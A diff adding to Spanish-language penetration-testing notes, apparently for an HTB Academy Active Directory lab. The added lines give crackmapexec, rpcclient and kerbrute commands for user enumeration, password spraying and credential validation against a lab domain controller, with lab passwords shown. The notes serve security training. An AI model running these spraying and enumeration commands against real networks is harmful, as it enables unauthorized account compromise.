@@ -172,5 +172,27 @@ De existir una sesion nula nos conectamos con rpclient y enumeramos los usuarios
 > ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
 
+## Con User y Pass validos
+
+> sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+
+# Password Spray
+
+>  for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
+> kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+
+>  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt # intenta enumerar usuarios validos
+
+
+> sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+## Validating the Credentials with CrackMapExec
+
+> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+
+>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep + # la lista debe de ser solo el nombre de usuario ejemplo mvazquez
+
+
 
 
